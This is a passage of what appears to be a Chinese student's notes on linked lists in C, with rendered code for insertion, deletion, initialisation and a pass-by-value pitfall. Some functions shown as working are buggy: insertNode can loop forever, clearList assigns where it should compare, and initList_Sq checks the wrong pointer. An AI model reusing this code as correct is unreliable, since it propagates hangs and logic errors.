<span class="hljs-keyword">if</span> (!list) <span class="hljs-keyword">return</span> OK;<br>    <span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">initList_Sq</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    list-&gt;elem = (ElemType *) <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(ElemType) * SIZE);<br>    <span class="hljs-keyword">if</span> (!list) <span class="hljs-keyword">return</span> ERROR;<br>    list-&gt;length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="线性表的链式储存"><a href="#线性表的链式储存" class="headerlink" title="线性表的链式储存"></a>线性表的链式储存</h3><ol><li><p>指针的组成：数据域和指针域（指向下一个）</p></li><li><p>链表的类型</p><ul><li><p>单链表：</p><p>只有一个指针域的链表</p></li><li><p>双链表：</p><p>有两个指针域的链表</p></li><li><p>循环链表：</p><p>首尾相连的链表</p></li></ul></li><li><p>空表的判断：</p><blockquote><p>看一下头指针的是否为NULL,如果为NULL则是空链表</p></blockquote></li><li><p>设置头节点的好处：</p><blockquote><ol><li>便于首元节点的处理</li><li>处理空表和非空表就一样了</li></ol></blockquote><p>![image-20230324170004103](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230324170004103.png)</p></li><li><p>存取元素的方法叫做顺序存取法</p><p>![image-20230324170213582](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230324170213582.png)</p><p>顺序表是随机存取 </p></li><li><p>链表的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//链表</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><span class="hljs-comment">//使用node表示节点</span><br><span class="hljs-comment">//使用linkList表示链表的</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">clearList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">listLength</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getElemSub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">char</span> e)</span>;<br><br>status <span class="hljs-title function_">getElemBySub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">int</span> sub, ElemType *e)</span>;<br><br>node *<span class="hljs-title function_">getElemPoint</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">char</span> e)</span>;<br><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub, ElemType e)</span>;<br><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList charListHead = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> e;<br>    <span class="hljs-type">int</span> sub;<br>    <span class="hljs-comment">//创建头节点</span><br>    charListHead = (linkList) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    charListHead-&gt;next = <span class="hljs-literal">NULL</span>;<br>    charListHead-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-comment">//初始化链表</span><br>    initList(charListHead);<br><br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s&quot;</span>, isEmpty(charListHead) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    <span class="hljs-comment">//清空链表</span><br>    clearList(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s\n&quot;</span>, isEmpty(charListHead) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    initList(charListHead);<br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, listLength(charListHead));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;e&#x27;</span>));<br><br>    getElemBySub(charListHead, <span class="hljs-number">5</span>, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c&quot;</span>, e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%p&quot;</span>, getElemPoint(charListHead, <span class="hljs-string">&#x27;e&#x27;</span>));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, insertNode(charListHead, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;a&#x27;</span>));<br>    getElemBySub(charListHead, <span class="hljs-number">2</span>, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c&quot;</span>, e);<br><br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, listLength(charListHead));<br>    printfNode(charListHead);<br><br>    sub = <span class="hljs-number">28</span>;<br>    deleteNode(charListHead, sub);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;Z&#x27;</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">//删除</span><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span> &#123;<br>    node *moveNode = headNode;<br>    node* temNode=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;sub&amp;&amp;moveNode-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br>        moveNode=moveNode-&gt;next;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(i&gt;=sub||moveNode==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    temNode=moveNode-&gt;next;<br>    moveNode-&gt;next=moveNode-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(temNode);<br>    <span class="hljs-keyword">return</span> OK;<br><br>&#125;<br><br><span class="hljs-comment">//插入元素</span><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub, ElemType e)</span> &#123;<br>    node *moveNode = headNode;<br>    node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    temNode-&gt;date = e;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &gt;= listLength(headNode)) &#123;<br>        <span class="hljs-built_in">free</span>(temNode);<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> tem = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (tem != sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    temNode-&gt;next = moveNode-&gt;next;<br>    moveNode-&gt;next = temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//取出元素返回地址</span><br>node *<span class="hljs-title function_">getElemPoint</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> ElemType e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span> &amp;&amp; moveNode-&gt;date != e) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> moveNode;<br>&#125;<br><br><br><span class="hljs-comment">//通过下标取出元素</span><br>status <span class="hljs-title function_">getElemBySub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">int</span> sub, ElemType *e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-type">int</span> tem = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (tem != sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>        tem++;<br>    &#125;<br>    *e = moveNode-&gt;date;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//取出元素通过下标</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getElemSub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> ElemType e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-type">int</span> sub = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (moveNode &amp;&amp; moveNode-&gt;date != e) &#123;<br>        moveNode = moveNode-&gt;next;<br>        sub++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (moveNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> sub;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//求链表的长度</span><br>status <span class="hljs-title function_">listLength</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        i++;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i<span class="hljs-number">-1</span>;<br>&#125;<br><br><br><span class="hljs-comment">//清空链表</span><br>status <span class="hljs-title function_">clearList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = <span class="hljs-literal">NULL</span>;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next = <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    headNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//判断是否为空</span><br>status <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//初始化</span><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *nextNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        nextNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        nextNode-&gt;date = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        moveNode-&gt;next = nextNode;<br>        moveNode = nextNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>链表操作的时间和空间复杂度</p><ul><li><p>查找  O(n)</p></li><li><p>插入和删除 O(1)</p><p>理由是，插入和删除都是在一瞬间发生的事，不包括前面的查找</p><p>所以在查找的时间复杂度为 O(n);</p></li></ul></li><li><p>链表初始化的方式</p><ul><li><p>头插法</p><p>意思是每次都是从头节点后面一位插入数据</p><p>这个是反循序的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node* temNode=(node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        <span class="hljs-keyword">if</span>(temNode==<span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">return</span> ERROR;<br>        &#125;<br>        temNode-&gt;date=<span class="hljs-string">&#x27;a&#x27;</span>+i;<br>        temNode-&gt;next=headNode-&gt;next;<br>        headNode-&gt;next=temNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>尾插法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//初始化</span><br>status <span class="hljs-title function_">initList2</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *nextNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        nextNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        nextNode-&gt;date = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        moveNode-&gt;next = nextNode;<br>        moveNode = nextNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>问题代码</p><ul><li>为什么将头节点放进函数<code>malloc</code>,在main函数中，头节点却是空？</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode = <span class="hljs-literal">NULL</span>;<br>    initList(headNode);<br>    printfNode(headNode);<br>    destroyList(headNode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    headNode = (linkList) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    headNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    headNode-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;date = <span class="hljs-string">&#x27;a&#x27;</span> + i;<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        moveNode-&gt;next = temNode;<br>        moveNode = temNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>原因：</p><p>C语言的传参本质上都是传值，也就是拷贝传参，普通变量拷贝的普通的值，指针变量拷贝的是指针</p><p>具体参考：<a href="%5B(21%E6%9D%A1%E6%B6%88%E6%81%AF">深入理解C语言函数传参方式</a> 深入理解C语言函数传参方式_c 为什么是一个一个传参的_amcomputer的博客-CSDN博客](<a href="https://blog.csdn.net/qq_39463175/article/details/115566613">https://blog.csdn.net/qq_39463175/article/details/115566613</a>))</p><p>所以修改后的代码是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 